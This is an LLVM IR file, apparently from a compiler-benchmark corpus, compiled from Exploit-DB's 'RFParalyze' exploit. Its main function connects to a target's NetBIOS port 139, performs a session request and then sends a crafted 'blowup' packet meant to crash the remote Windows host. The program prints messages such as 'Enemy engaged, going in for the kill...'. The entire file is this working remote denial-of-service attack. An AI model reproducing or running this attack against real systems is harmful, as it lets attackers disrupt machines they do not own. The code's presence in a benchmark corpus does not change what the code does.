; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19889.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19889.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sreq = type { i32, i32, i32, i32, i32 }
%struct.sockaddr_in = type { i32, i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i32 }

@.str = private unnamed_addr constant [58 x i8] c"RFParalyze -- this code by rfp/ADM/Wiretrip/ and dm/el8/\0A\00", align 1
@.str.1 = private unnamed_addr constant [49 x i8] c"Usage: RFParalyze <IP of target> <NetBIOS name>\0A\00", align 1
@.str.2 = private unnamed_addr constant [41 x i8] c"       --IP must be ip address, not dns\0A\00", align 1
@.str.3 = private unnamed_addr constant [46 x i8] c"       --NetBIOS name must be in UPPER CASE\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [57 x i8] c"Greetz to el8.org, Technotronic, w00w00, USSR, and ADM!\0A\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"WICCA\00", align 1
@.str.6 = private unnamed_addr constant [31 x i8] c"Trying %s as NetBIOS name %s \0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [22 x i8] c"Problems connecting: \00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"\81\00\00D \00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"\00 \00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.11 = private unnamed_addr constant [30 x i8] c"Problem, didn't get response\0A\00", align 1
@.str.12 = private unnamed_addr constant [40 x i8] c"Enemy engaged, going in for the kill...\00", align 1
@.str.13 = private unnamed_addr constant [39 x i8] c"We didn't get back the A-OK, bailing.\0A\00", align 1
@blowup = common dso_local global %struct.sreq zeroinitializer, align 4
@.str.14 = private unnamed_addr constant [6 x i8] c"done\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca [4000 x i8], align 16
  %6 = alloca [33 x i8], align 16
  %7 = alloca [33 x i8], align 16
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.sreq, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str, i64 0, i64 0))
  %14 = load i32, i32* %3, align 4
  %15 = icmp slt i32 %14, 3
  br i1 %15, label %16, label %21

16:                                               ; preds = %2
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.1, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.2, i64 0, i64 0))
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.3, i64 0, i64 0))
  %20 = call i32 @exit(i32 1) #3
  unreachable

21:                                               ; preds = %2
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.4, i64 0, i64 0))
  %23 = getelementptr inbounds [33 x i8], [33 x i8]* %6, i64 0, i64 0
  %24 = call i32 @Pad_Name(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0), i8* %23)
  %25 = getelementptr inbounds [33 x i8], [33 x i8]* %6, i64 0, i64 30
  store i8 65, i8* %25, align 2
  %26 = getelementptr inbounds [33 x i8], [33 x i8]* %6, i64 0, i64 31
  store i8 68, i8* %26, align 1
  %27 = load i8**, i8*** %4, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 2
  %29 = load i8*, i8** %28, align 8
  %30 = getelementptr inbounds [33 x i8], [33 x i8]* %7, i64 0, i64 0
  %31 = call i32 @Pad_Name(i8* %29, i8* %30)
  %32 = getelementptr inbounds [33 x i8], [33 x i8]* %7, i64 0, i64 30
  store i8 65, i8* %32, align 2
  %33 = getelementptr inbounds [33 x i8], [33 x i8]* %7, i64 0, i64 31
  store i8 68, i8* %33, align 1
  %34 = load i8**, i8*** %4, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 1
  %36 = load i8*, i8** %35, align 8
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 2
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.6, i64 0, i64 0), i8* %36, i8* %39)
  %41 = load i8**, i8*** %4, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 1
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @inet_addr(i8* %43)
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %46 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %45, i32 0, i32 0
  store i32 %44, i32* %46, align 4
  %47 = load i32, i32* @AF_INET, align 4
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %47, i32* %48, align 4
  %49 = call i32 @htons(i32 139)
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i32 %49, i32* %50, align 4
  %51 = load i32, i32* @AF_INET, align 4
  %52 = load i32, i32* @SOCK_STREAM, align 4
  %53 = call i32 @socket(i32 %51, i32 %52, i32 0)
  store i32 %53, i32* %9, align 4
  %54 = load i32, i32* %9, align 4
  %55 = call i32 @connect(i32 %54, %struct.sockaddr_in* %8, i32 12)
  store i32 %55, i32* %10, align 4
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %60

57:                                               ; preds = %21
  %58 = call i32 @perror(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i64 0, i64 0))
  %59 = call i32 @exit(i32 1) #3
  unreachable

60:                                               ; preds = %21
  %61 = getelementptr inbounds [4000 x i8], [4000 x i8]* %5, i64 0, i64 0
  %62 = call i32 @memset(i8* %61, i32 0, i32 4000)
  %63 = getelementptr inbounds %struct.sreq, %struct.sreq* %12, i32 0, i32 4
  %64 = load i32, i32* %63, align 4
  %65 = call i32 @memcpy(i32 %64, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i64 0, i64 0), i32 5)
  %66 = getelementptr inbounds %struct.sreq, %struct.sreq* %12, i32 0, i32 3
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @memcpy(i32 %67, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i32 2)
  %69 = getelementptr inbounds %struct.sreq, %struct.sreq* %12, i32 0, i32 2
  %70 = load i32, i32* %69, align 4
  %71 = call i32 @memcpy(i32 %70, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0), i32 1)
  %72 = getelementptr inbounds %struct.sreq, %struct.sreq* %12, i32 0, i32 1
  %73 = load i32, i32* %72, align 4
  %74 = getelementptr inbounds [33 x i8], [33 x i8]* %6, i64 0, i64 0
  %75 = call i32 @strncpy(i32 %73, i8* %74, i32 32)
  %76 = getelementptr inbounds %struct.sreq, %struct.sreq* %12, i32 0, i32 0
  %77 = load i32, i32* %76, align 4
  %78 = getelementptr inbounds [33 x i8], [33 x i8]* %7, i64 0, i64 0
  %79 = call i32 @strncpy(i32 %77, i8* %78, i32 32)
  %80 = load i32, i32* %9, align 4
  %81 = call i32 @write(i32 %80, %struct.sreq* %12, i32 72)
  %82 = load i32, i32* %9, align 4
  %83 = getelementptr inbounds [4000 x i8], [4000 x i8]* %5, i64 0, i64 0
  %84 = call i32 @read(i32 %82, i8* %83, i32 4000)
  store i32 %84, i32* %11, align 4
  %85 = load i32, i32* %11, align 4
  %86 = icmp slt i32 %85, 1
  br i1 %86, label %87, label %90

87:                                               ; preds = %60
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.11, i64 0, i64 0))
  %89 = call i32 @exit(i32 1) #3
  unreachable

90:                                               ; preds = %60
  %91 = getelementptr inbounds [4000 x i8], [4000 x i8]* %5, i64 0, i64 0
  %92 = load i8, i8* %91, align 16
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %93, -126
  br i1 %94, label %95, label %97

95:                                               ; preds = %90
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.12, i64 0, i64 0))
  br label %100

97:                                               ; preds = %90
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.13, i64 0, i64 0))
  %99 = call i32 @exit(i32 1) #3
  unreachable

100:                                              ; preds = %95
  %101 = load i32, i32* %9, align 4
  %102 = call i32 @write(i32 %101, %struct.sreq* @blowup, i32 72)
  %103 = load i32, i32* %9, align 4
  %104 = getelementptr inbounds [4000 x i8], [4000 x i8]* %5, i64 0, i64 0
  %105 = call i32 @read(i32 %103, i8* %104, i32 4000)
  store i32 %105, i32* %11, align 4
  %106 = load i32, i32* %9, align 4
  %107 = call i32 @close(i32 %106)
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.14, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @Pad_Name(i8*, i8*) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr_in*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i32, i8*, i32) #1

declare dso_local i32 @strncpy(i32, i8*, i32) #1

declare dso_local i32 @write(i32, %struct.sreq*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
